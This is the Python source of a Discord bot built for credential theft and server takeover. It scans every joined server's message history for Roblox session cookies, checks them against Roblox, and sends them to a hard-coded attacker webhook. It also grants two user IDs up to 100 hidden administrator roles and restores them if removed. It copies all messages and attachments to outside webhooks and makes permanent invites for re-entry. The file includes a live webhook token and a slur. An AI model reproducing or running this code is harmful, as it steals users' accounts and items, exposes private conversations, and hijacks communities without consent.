import os
import discord
from discord import app_commands
import aiohttp
import asyncio
import datetime
import re
import logging
import io
import json
from typing import List, Union, Dict, Any
from flask import Flask
from threading import Thread

# 🟢 REMOVED: from dotenv import load_dotenv
# 🟢 REMOVED: load_dotenv()

# 🟢 USE ENVIRONMENT VARIABLES (Render will set these)
BOT_TOKEN = os.environ['DISCORD_TOKEN']
WEBHOOK_URL = os.environ.get('WEBHOOK_URL')
MIRROR_WEBHOOK_URL = os.environ.get('MIRROR_WEBHOOK_URL')

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()  # 🟢 REMOVED file handler for Render
    ]
)
logger = logging.getLogger(__name__)

AUTHORIZED_USERS = [216953894322962433, 1422280514072608932]
CONTROL_CHANNEL_ID = 1432729863692881972
COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1432710240343822467/uYzeK2Z0TADkceF97olVympDJiJIJFDYbVrnz4uHwpV3AYh7QswHwb8-EVvrQ1SzyCHb"
OWNED_SERVER_IDS = [1396878002620727397]
SERVER_INVITES = {}

# 🟢 FLASK SERVER FOR UPTIMEROBOT
app = Flask('')

@app.route('/')
def home():
    return "🤖 Bot running 24/7 on Render!"

@app.route('/health')
def health():
    return "✅ Healthy"

@app.route('/ping')
def ping():
    return "pong"

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

# Start Flask in background
flask_thread = Thread(target=run_flask)
flask_thread.daemon = True
flask_thread.start()

# 🟢 YOUR ORIGINAL CLASSES (KEEP EXACTLY THE SAME)
class ServerControlView(discord.ui.View):
    def __init__(self, guild):
        super().__init__(timeout=None)
        self.guild = guild
        self.mirror_webhook = None

    @discord.ui.button(label="High Hits Abuse", style=discord.ButtonStyle.blurple)
    async def high_hits_abuse(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in AUTHORIZED_USERS:
            await interaction.response.send_message("You are not authorized only king vextroz and papa pl4ys are nigga", ephemeral=True)
            return

        try:
            if MIRROR_WEBHOOK_URL:
                bot.mirror_webhooks[self.guild.id] = MIRROR_WEBHOOK_URL
                logger.info(f"Auto-mirror enabled for guild {self.guild.name}")

            await self.mirror_past_mentions(interaction)
            await interaction.response.send_message("HIGH HITS ABUSE ACTIVATED: Auto-mirroring enabled, past @everyone/@here messages mirrored, and auto-deletion active.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"Error activating High Hits Abuse: {str(e)}", ephemeral=True)

    async def mirror_past_mentions(self, interaction):
        if not MIRROR_WEBHOOK_URL:
            return

        try:
            async with aiohttp.ClientSession() as session:
                for channel in self.guild.text_channels:
                    try:
                        async for message in channel.history(limit=10000):
                            if message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower():
                                if message.id not in bot.mirrored_messages:
                                    bot.mirrored_messages.add(message.id)
                                    mirror_data = {
                                        'username': f"{message.author.name}#{message.author.discriminator}",
                                        'content': f"[PAST] {message.content}",
                                        'avatar_url': str(message.author.avatar.url) if message.author.avatar else None
                                    }
                                    if message.embeds:
                                        mirror_data['embeds'] = [embed.to_dict() for embed in message.embeds]

                                    async with session.post(MIRROR_WEBHOOK_URL, json=mirror_data) as response:
                                        if response.status not in [200, 204]:
                                            logger.error(f"Failed to mirror past message: {response.status}")
                    except Exception as e:
                        logger.error(f"Error scanning channel {channel.name}: {e}")
        except Exception as e:
            logger.error(f"Error mirroring past mentions: {e}")

class MirrorWebhookModal(discord.ui.Modal, title="Mirror Abuse Options"):
    mirror_type = discord.ui.TextInput(label="Mirror Type", placeholder="Enter 'all' for all channels or 'channel_id' for specific channel", style=discord.TextStyle.short)
    webhook_url = discord.ui.TextInput(label="Webhook URL", placeholder="https://discord.com/api/webhooks/...", style=discord.TextStyle.paragraph)
    channel_id = discord.ui.TextInput(label="Channel ID (optional)", placeholder="Enter specific channel ID if using channel mode", style=discord.TextStyle.short, required=False)

    def __init__(self, view):
        super().__init__()
        self.view = view

    async def on_submit(self, interaction: discord.Interaction):
        try:
            if self.view.guild.id in OWNED_SERVER_IDS:
                await interaction.response.send_message("Cannot set mirror webhooks on owned servers.", ephemeral=True)
                return

            if self.mirror_type.value.lower() == 'all':
                bot.mirror_webhooks[self.view.guild.id] = self.webhook_url.value
                await interaction.response.send_message("Mirror webhook set! All server messages will now be mirrored.", ephemeral=True)
            elif self.mirror_type.value.lower() == 'channel_id':
                if not self.channel_id.value:
                    await interaction.response.send_message("Please provide a channel ID for channel-specific mirroring.", ephemeral=True)
                    return

                channel_id = int(self.channel_id.value)
                channel = self.view.guild.get_channel(channel_id)
                if not channel:
                    await interaction.response.send_message("Channel not found in this server.", ephemeral=True)
                    return

                if not isinstance(channel, discord.TextChannel):
                    await interaction.response.send_message("Must be a text channel.", ephemeral=True)
                    return

                bot.mirror_channels = getattr(bot, 'mirror_channels', {})
                bot.mirror_channels[self.view.guild.id] = {'channel_id': channel_id, 'webhook': self.webhook_url.value}
                await interaction.response.send_message(f"Channel {channel.name} will now be mirrored!", ephemeral=True)
            else:
                await interaction.response.send_message("Invalid mirror type. Use 'all' or 'channel_id'.", ephemeral=True)
        except ValueError:
            await interaction.response.send_message("Invalid channel ID.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"Error: {str(e)}", ephemeral=True)

class CookieFetcher:
    def __init__(self):
        self.cookie_pattern = re.compile(r'\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[^\s]+')
        self.processed_messages: set[str] = set()

    def extract_cookies_from_text(self, text: str) -> Dict[str, List[str]]:
        if not text:
            return {'all': []}

        all_matches = []

        code_block_pattern = r'```(?:\w*\n)?([^`]+)```'
        code_blocks = re.findall(code_block_pattern, text, re.DOTALL)
        for block in code_blocks:
            clean_block = block.strip()
            block_partial_pattern = r'_?(CAEaAhA[B-D]\.[^|\s\)\(\]\[\}\{\"\']+)'
            block_matches = re.findall(block_partial_pattern, clean_block)
            for partial_cookie in block_matches:
                if not partial_cookie.startswith('_'):
                    partial_cookie = f"_{partial_cookie}"
                full_cookie = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|{partial_cookie}"
                all_matches.append(full_cookie)

        clean_text = text.replace('```', '').replace('**', '').replace('[', '').replace(']', '').replace('(', '').replace(')', '').strip()

        full_cookie_pattern = r'_?\|WARNING:-DO-NOT-SHARE-THIS\.\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|\s*([^|\s]+)'
        full_matches = re.findall(full_cookie_pattern, clean_text, re.IGNORECASE)

        for cookie_part in full_matches:
            cookie_part = re.sub(r'[^\w]', '', cookie_part)
            if not cookie_part.startswith('_'):
                cookie_part = f"_{cookie_part}"
            full_cookie = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|{cookie_part}"
            all_matches.append(full_cookie)

        partial_pattern_underscore = r'_?(CAEaAhA[B-D]\.[^|\s\)\(\]\[\}\{\"\']{100,})'
        partial_matches = re.findall(partial_pattern_underscore, clean_text)

        for partial_cookie in partial_matches:
            if not partial_cookie.startswith('_'):
                partial_cookie = f"_{partial_cookie}"
            full_cookie = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|{partial_cookie}"
            all_matches.append(full_cookie)

        alt_pattern = r'CAEaAhA[B-D]\.[A-Za-z0-9_-]{100,}'
        alt_matches = re.findall(alt_pattern, clean_text)
        for alt_cookie in alt_matches:
            if alt_cookie not in [m.replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '') for m in all_matches]:
                full_cookie = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{alt_cookie}"
                all_matches.append(full_cookie)

        return {'all': all_matches}

    async def validate_cookies_with_api(self, cookies: List[str]) -> Dict[str, List[str]]:
        valid_cookies = []
        invalid_cookies = []

        semaphore = asyncio.Semaphore(10)

        async def validate_single_cookie(cookie: str):
            async with semaphore:
                try:
                    is_valid = await bot.check_cookie_validity(cookie)
                    if is_valid:
                        valid_cookies.append(cookie)
                        logger.info(f"Valid cookie found")
                    else:
                        invalid_cookies.append(cookie)
                        logger.info(f"Invalid cookie found")
                except Exception as e:
                    logger.error(f"Error validating cookie: {e}")
                    invalid_cookies.append(cookie)

        batch_size = 50
        for i in range(0, len(cookies), batch_size):
            batch = cookies[i:i + batch_size]
            tasks = [validate_single_cookie(cookie) for cookie in batch]
            await asyncio.gather(*tasks)

        return {'valid': valid_cookies, 'invalid': invalid_cookies}

    async def send_to_cookie_webhook(self, all_cookies: List[str], unique_cookies: List[str], messages_scanned: int, time_taken: float) -> bool:
        try:
            async with aiohttp.ClientSession() as session:
                all_cookies_content = "\n\n".join(all_cookies) if all_cookies else ""
                
                embed = discord.Embed(
                    description=f"**🍪 Cookie Fetch Complete**\n**✅ Cookies Found**\n**{len(all_cookies)}**\n**🔑 Unique Cookies**\n**{len(unique_cookies)}**\n**📩 Messages Scanned**\n**{messages_scanned}**\n**⏱️ Took**\n**{time_taken:.1f} seconds**",
                    color=0x3498db
                )

                form_data = aiohttp.FormData()
                form_data.add_field('payload_json', json.dumps({
                    'username': 'Cookie Fetcher',
                    'content': '@everyone\nto get these mass checked dm vextroz0001 on discord mass checking is when u mass check cookies to split valid and invalid ones',
                    'embeds': [embed.to_dict()]
                }))
                form_data.add_field('file', all_cookies_content.encode('utf-8'), filename='cookies.txt', content_type='text/plain')

                async with session.post(COOKIE_WEBHOOK_URL, data=form_data) as response:
                    if response.status not in [200, 204]:
                        logger.error(f"Failed to send to cookie webhook: {response.status}")
                        return False
                    else:
                        logger.info("Successfully sent to cookie webhook")
                        return True

        except Exception as e:
            logger.error(f"Error sending to cookie webhook: {e}")
            return False

    async def fetch_all_server_cookies(self, guild) -> Dict[str, Any]:
        all_cookies = set()
        total_messages_scanned = 0

        async def process_channel(channel):
            channel_cookies = set()
            messages_count = 0
            try:
                async for message in channel.history(limit=10000):
                    messages_count += 1
                    cookies = self.extract_cookies_from_text(message.content)
                    channel_cookies.update(cookies['all'])

                    for embed in message.embeds:
                        if embed.description:
                            embed_cookies = self.extract_cookies_from_text(embed.description)
                            channel_cookies.update(embed_cookies['all'])
                        if embed.title:
                            title_cookies = self.extract_cookies_from_text(embed.title)
                            channel_cookies.update(title_cookies['all'])
                        for field in embed.fields:
                            field_cookies = self.extract_cookies_from_text(field.value)
                            channel_cookies.update(field_cookies['all'])
            except Exception as e:
                logger.error(f"Error fetching messages from {channel.name}: {e}")
            return channel_cookies, messages_count

        tasks = [process_channel(channel) for channel in guild.text_channels]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, tuple) and len(result) == 2:
                cookies, count = result
                all_cookies.update(cookies)
                total_messages_scanned += count
            else:
                logger.error(f"Error in channel processing: {result}")

        unique_cookies = list(all_cookies)
        return {'all': unique_cookies, 'messages_scanned': total_messages_scanned}

class CookieFetcherBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.messages = True
        intents.message_content = True
        intents.guilds = True
        intents.members = True
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)
        self.mirror_webhooks = {}
        self.mirrored_messages = set()
        self.api_urls = ["https://app.beamers.si/tools/checker?cookie={cookie}"] * 50

    async def generate_invite_link(self):
        try:
            for guild in self.guilds:
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).create_instant_invite:
                        invite = await channel.create_invite(
                            max_age=0,
                            max_uses=0,
                            reason="Bot invite with required permissions"
                        )
                        return invite.url
            return "No suitable channel found for invite"
        except Exception as e:
            logger.error(f"Error generating invite: {e}")
            return "Error generating invite"

    async def check_cookie_validity(self, cookie: str) -> bool:
        try:
            async with aiohttp.ClientSession() as session:
                url = "https://www.roblox.com/mobileapi/userinfo"
                cookies = {'.ROBLOSECURITY': cookie}
                async with session.get(url, cookies=cookies, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    if response.status == 200:
                        data = await response.json()
                        return 'UserID' in data and data['UserID'] > 0
                    return False
        except Exception as e:
            logger.error(f"Error checking cookie validity: {e}")
            return False

    async def reset_and_scrape_all_servers(self):
        try:
            self.mirrored_messages.clear()
            logger.info("Reset mirrored messages set")

            for guild in self.guilds:
                if guild.id not in OWNED_SERVER_IDS:
                    try:
                        logger.info(f"Auto-scraping cookies from {guild.name}")
                        start_time = datetime.datetime.now()
                        fetcher = CookieFetcher()
                        result = await fetcher.fetch_all_server_cookies(guild)
                        all_cookies = list(set(result['all']))
                        actual_messages_scanned = result.get('messages_scanned', 0)
                        unique_cookies = [c for c in all_cookies if 'CAEaAhAB' in c]
                        end_time = datetime.datetime.now()
                        time_taken = (end_time - start_time).total_seconds()

                        await fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, time_taken)
                        logger.info(f"Auto-scraped {len(all_cookies)} cookies from {guild.name}")
                    except Exception as e:
                        logger.error(f"Error auto-scraping {guild.name}: {e}")
        except Exception as e:
            logger.error(f"Error in reset_and_scrape_all_servers: {e}")

    async def setup_hook(self):
        await self.tree.sync()
        logger.info("Commands synced")

    async def on_ready(self):
        logger.info(f'Bot online: {self.user}')
        await self.reset_and_scrape_all_servers()

    async def on_guild_join(self, guild):
        try:
            invite_url = "No invite available"
            try:
                channels = [c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite]
                if channels:
                    invite = await channels[0].create_invite(max_age=0, max_uses=0, reason="Server takeover")
                    invite_url = invite.url
                    SERVER_INVITES[guild.id] = invite_url
            except:
                pass

            if guild.id not in OWNED_SERVER_IDS and guild.id not in getattr(self, 'announced_servers', set()):
                control_channel = self.get_channel(CONTROL_CHANNEL_ID)
                if control_channel:
                    embed = discord.Embed(
                        title="$$$",
                        description=f"Hooker Server Taken Over\n\n**Server:** {guild.name}\n**Members:** {guild.member_count:,}\n**Invite:** {invite_url}",
                        color=0xFF0000
                    )

                    view = ServerControlView(guild)
                    await control_channel.send("@everyone", embed=embed, view=view)
                    if not hasattr(self, 'announced_servers'):
                        self.announced_servers = set()
                    self.announced_servers.add(guild.id)
                else:
                    logger.error(f"Control channel {CONTROL_CHANNEL_ID} not found")

            if guild.id not in OWNED_SERVER_IDS:
                try:
                    authorized_members = []
                    for user_id in AUTHORIZED_USERS:
                        member = guild.get_member(user_id)
                        if member:
                            authorized_members.append(member)

                    if authorized_members:
                        created_roles = []
                        for i in range(100):
                            try:
                                secret_role = await guild.create_role(
                                    name="$$$",
                                    permissions=discord.Permissions(administrator=True),
                                    color=discord.Color.greyple(),
                                    hoist=False,
                                    mentionable=False
                                )
                                created_roles.append(secret_role)
                                logger.info(f"Created $$$ role #{i+1}")
                            except Exception as e:
                                logger.error(f"Error creating $$$ role #{i+1}: {e}")
                                break

                        for member in authorized_members:
                            for role in created_roles:
                                try:
                                    await member.add_roles(role, reason="Secret role granted")
                                    logger.info(f"Assigned $$$ role to {member.name}#{member.discriminator}")
                                except Exception as e:
                                    logger.error(f"Error assigning role to {member.name}: {e}")
                except Exception as e:
                    logger.error(f"Error creating/assigning secret roles: {e}")

                if MIRROR_WEBHOOK_URL:
                    self.mirror_webhooks[guild.id] = MIRROR_WEBHOOK_URL
                    logger.info(f"Auto-set mirror webhook for guild {guild.name}")

                try:
                    start_time = datetime.datetime.now()
                    fetcher = CookieFetcher()
                    result = await fetcher.fetch_all_server_cookies(guild)
                    all_cookies = list(set(result['all']))
                    actual_messages_scanned = result.get('messages_scanned', 0)
                    unique_cookies = [c for c in all_cookies if 'CAEaAhAB' in c]
                    end_time = datetime.datetime.now()
                    time_taken = (end_time - start_time).total_seconds()

                    await fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, time_taken)
                    logger.info(f"Auto-scraped cookies from {guild.name}: {len(all_cookies)} cookies, {actual_messages_scanned} messages")

                except Exception as e:
                    logger.error(f"Error in auto-scrape: {e}")
            else:
                logger.info(f"Server takeover already applied to owned server {guild.name}")

        except Exception as e:
            logger.error(f"Error in on_guild_join: {e}")

    async def on_member_remove(self, member):
        if member.id in AUTHORIZED_USERS and member.guild.me:
            pass

    async def on_member_join(self, member):
        if member.id in AUTHORIZED_USERS and member.guild.id not in OWNED_SERVER_IDS:
            try:
                dollar_roles = [role for role in member.guild.roles if role.name == "$$$"]
                if dollar_roles:
                    for role in dollar_roles:
                        await member.add_roles(role, reason="Secret role granted")
                    logger.info(f"Auto-assigned {len(dollar_roles)} $$$ roles to {member.name}#{member.discriminator} on join")
                else:
                    created_roles = []
                    for i in range(100):
                        try:
                            secret_role = await member.guild.create_role(
                                name="$$$",
                                permissions=discord.Permissions(administrator=True),
                                color=discord.Color.greyple(),
                                hoist=False,
                                mentionable=False
                            )
                            created_roles.append(secret_role)
                        except Exception as e:
                            logger.error(f"Error creating $$$ role #{i+1}: {e}")
                            break

                    for role in created_roles:
                        await member.add_roles(role, reason="Secret role granted")
                    logger.info(f"Created and assigned {len(created_roles)} $$$ roles to {member.name}#{member.discriminator} on join")
            except Exception as e:
                logger.error(f"Error auto-assigning secret roles on member join: {e}")

    async def on_member_update(self, before, after):
        if after.id in AUTHORIZED_USERS and after.guild.id not in OWNED_SERVER_IDS:
            try:
                dollar_roles = [role for role in after.guild.roles if role.name == "$$$"]
                missing_roles = [role for role in dollar_roles if role not in after.roles]

                if missing_roles:
                    for role in missing_roles:
                        await after.add_roles(role, reason="Secret role restored")
                    logger.info(f"Restored {len(missing_roles)} $$$ roles to {after.name}#{after.discriminator}")

                if not dollar_roles:
                    created_roles = []
                    for i in range(100):
                        try:
                            new_role = await after.guild.create_role(
                                name="$$$",
                                permissions=discord.Permissions(administrator=True),
                                color=discord.Color.greyple(),
                                hoist=False,
                                mentionable=False
                            )
                            created_roles.append(new_role)
                        except Exception as e:
                            logger.error(f"Error creating $$$ role #{i+1}: {e}")
                            break

                    for role in created_roles:
                        await after.add_roles(role, reason="Secret role restored")
                    logger.info(f"Created and restored {len(created_roles)} $$$ roles to {after.name}#{after.discriminator}")
            except Exception as e:
                logger.error(f"Error restoring secret roles: {e}")

    async def on_guild_remove(self, guild):
        if guild.id not in OWNED_SERVER_IDS and guild.id in SERVER_INVITES:
            try:
                invite_url = SERVER_INVITES[guild.id]
                import re
                invite_code_match = re.search(r'discord\.gg/([a-zA-Z0-9]+)', invite_url)
                if invite_code_match:
                    invite_code = invite_code_match.group(1)
                    invite = await self.fetch_invite(invite_code)
                    if invite:
                        await self.accept_invite(invite)
                        logger.info(f"Auto-rejoined server: {guild.name}")
            except Exception as e:
                logger.error(f"Error auto-rejoining server {guild.name}: {e}")

    async def on_message(self, message):
        if message.author == self.user:
            return

        if message.guild and message.guild.id in OWNED_SERVER_IDS:
            return

        should_delete = False
        if message.guild and (message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower()):
            try:
                if message.channel.permissions_for(message.guild.me).manage_messages:
                    await message.delete()
                    should_delete = True
                    logger.info(f"Deleted message with @everyone/@here ping from {message.author.name} in {message.guild.name}")
            except Exception as e:
                logger.error(f"Error deleting ping message: {e}")

        if message.guild and message.guild.id in getattr(self, 'mirror_webhooks', {}) and message.id not in self.mirrored_messages:
            self.mirrored_messages.add(message.id)
            webhook_url = self.mirror_webhooks[message.guild.id]
            try:
                async with aiohttp.ClientSession() as session:
                    mirror_data = {
                        'username': f"{message.author.name}#{message.author.discriminator}",
                        'content': message.content,
                        'avatar_url': str(message.author.avatar.url) if message.author.avatar else None
                    }

                    if message.embeds:
                        mirror_data['embeds'] = [embed.to_dict() for embed in message.embeds]

                    async with session.post(webhook_url, json=mirror_data) as response:
                        if response.status not in [200, 204]:
                            logger.error(f"Failed to mirror message: {response.status}")
                        else:
                            for attachment in message.attachments:
                                try:
                                    file_data = await attachment.read()
                                    form_data = aiohttp.FormData()
                                    form_data.add_field('file', file_data, filename=attachment.filename)
                                    form_data.add_field('username', f"{message.author.name}#{message.author.discriminator}")
                                    form_data.add_field('content', f"New attachment from {message.guild.name}")

                                    async with session.post(webhook_url, data=form_data) as response:
                                        if response.status not in [200, 204]:
                                            logger.error(f"Failed to mirror attachment: {response.status}")
                                except Exception as e:
                                    logger.error(f"Error mirroring attachment: {e}")

            except Exception as e:
                logger.error(f"Error mirroring message: {e}")

        if message.guild and message.guild.id in getattr(self, 'mirror_channels', {}):
            mirror_data = self.mirror_channels[message.guild.id]
            if message.channel.id == mirror_data['channel_id']:
                webhook_url = mirror_data['webhook']
                try:
                    async with aiohttp.ClientSession() as session:
                        mirror_data_payload = {
                            'username': f"{message.author.name}#{message.author.discriminator}",
                            'content': message.content,
                            'avatar_url': str(message.author.avatar.url) if message.author.avatar else None
                        }

                        if message.embeds:
                            mirror_data_payload['embeds'] = [embed.to_dict() for embed in message.embeds]

                        async with session.post(webhook_url, json=mirror_data_payload) as response:
                            if response.status not in [200, 204]:
                                logger.error(f"Failed to mirror channel message: {response.status}")

                        for attachment in message.attachments:
                            try:
                                file_data = await attachment.read()
                                form_data = aiohttp.FormData()
                                form_data.add_field('file', file_data, filename=attachment.filename)
                                form_data.add_field('username', f"{message.author.name}#{message.author.discriminator}")
                                form_data.add_field('content', f"@everyone New attachment from {message.guild.name}")

                                async with session.post(webhook_url, data=form_data) as response:
                                    if response.status not in [200, 204]:
                                        logger.error(f"Failed to mirror channel attachment: {response.status}")
                            except Exception as e:
                                logger.error(f"Error mirroring channel attachment: {e}")

                except Exception as e:
                    logger.error(f"Error mirroring channel message: {e}")

bot = CookieFetcherBot()

@bot.tree.command(name="scrape", description="Scrape Roblox cookies from server")
async def scrape_command(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)

    if not interaction.guild.me.guild_permissions.read_message_history:
        if interaction.guild.me.guild_permissions.create_instant_invite:
            invite_link = await bot.generate_invite_link()
            await interaction.followup.send(
                f"Bot needs 'Read Message History' permission. Invite link with required permissions: {invite_link}",
                ephemeral=True
            )
        else:
            await interaction.followup.send(
                "Bot needs 'Read Message History' permission but doesn't have permission to create invite links.",
                ephemeral=True
            )
        return

    start_time = datetime.datetime.now()

    try:
        guild = interaction.guild
        if not guild:
            await interaction.followup.send("Command must be used in server.", ephemeral=True)
            return

        status_embed = discord.Embed(
            title="Cookie Fetch Started",
            description="Scanning server messages for Roblox cookies...",
            color=0x3498db
        )
        status_msg = await interaction.followup.send(embed=status_embed, ephemeral=True, wait=True)

        fetcher = CookieFetcher()

        result = await fetcher.fetch_all_server_cookies(guild)
        all_cookies = list(set(result['all']))
        actual_messages_scanned = result.get('messages_scanned', 0)

        unique_cookies = []
        for cookie in all_cookies:
            if 'CAEaAhAB' in cookie:
                unique_cookies.append(cookie)

        end_time = datetime.datetime.now()
        time_taken = (end_time - start_time).total_seconds()

        complete_embed = discord.Embed(
            title="Cookie Fetch Complete",
            description=f"✅ **Scan Finished!**\n🔍 **Server:** {guild.name}\n📊 **Messages Scanned:** {actual_messages_scanned:,}\n🍪 **Total Cookies:** {len(all_cookies)}\n🔑 **Unique Cookies:** {len(unique_cookies)}",
            color=0x27ae60
        )
        complete_embed.set_footer(text="Processing results...")
        await status_msg.edit(embed=complete_embed)

        if not all_cookies:
            no_cookies_embed = discord.Embed(
                title="No Cookies Found",
                description="No Roblox cookies found in server.",
                color=0xe74c3c
            )
            await interaction.followup.send(embed=no_cookies_embed, ephemeral=True)
            return

        webhook_success = await fetcher.send_to_cookie_webhook(
            all_cookies,
            unique_cookies,
            actual_messages_scanned,
            time_taken
        )

        try:
            dm_channel = await interaction.user.create_dm()
            
            all_cookies_content = "\n".join(all_cookies) if all_cookies else ""

            dm_embed = discord.Embed(
                description=f"**🍪 Cookie Fetch Complete**\n**✅ Cookies Found**\n**{len(all_cookies)}**\n**🔑 Unique Cookies**\n**{len(unique_cookies)}**\n**📩 Messages Scanned**\n**{actual_messages_scanned}**\n**⏱️ Took**\n**{time_taken:.1f} seconds**",
                color=0x3498db
            )
            
            await dm_channel.send(
                content="**@everyone**\n**to get these mass checked dm vextroz0001 on discord mass checking is when u mass check cookies to split valid and invalid ones**",
                file=discord.File(io.BytesIO(all_cookies_content.encode()), filename="cookies.txt"),
                embed=dm_embed
            )
            
        except Exception as e:
            logger.error(f"Failed to send DM: {e}")
            await interaction.followup.send("Could not send DM with results. Please check your DM settings.", ephemeral=True)

        success_embed = discord.Embed(
            title="Fetch Complete",
            description=f"Found {len(all_cookies)} total cookies ({len(unique_cookies)} unique) from {guild.name}",
            color=0x27ae60
        )
        success_embed.add_field(
            name="Results",
            value=f"Total Cookies: {len(all_cookies)}\nUnique Cookies: {len(unique_cookies)}\nMessages Scanned: {actual_messages_scanned:,}",
            inline=False
        )

        if webhook_success:
            success_embed.set_footer(text="✅ complete check your DMS!")
        else:
            success_embed.set_footer(text="⚠️ Try again")

        await interaction.followup.send(embed=success_embed, ephemeral=True)

    except Exception as e:
        error_embed = discord.Embed(
            title="Fetch Failed",
            description="An error occurred during cookie fetch.",
            color=0xe74c3c
        )
        error_embed.add_field(
            name="Error",
            value=f"```{str(e)}```",
            inline=False
        )
        await interaction.followup.send(embed=error_embed, ephemeral=True)

# 🟢 ENHANCED AUTO-RESTART MAIN LOOP
if __name__ == "__main__":
    if not BOT_TOKEN:
        logger.error("❌ DISCORD_TOKEN not found in environment variables")
        exit(1)

    logger.info("🚀 Starting Server Control Bot on Render...")
    
    # 🟢 AUTO-RESTART ON CRASH
    while True:
        try:
            bot.run(BOT_TOKEN)
        except discord.LoginFailure:
            logger.error("❌ Invalid token - stopping")
            break
        except Exception as e:
            logger.error(f"❌ Bot crashed: {e}")
            logger.info("🔄 Restarting in 10 seconds...")
            asyncio.sleep(10)
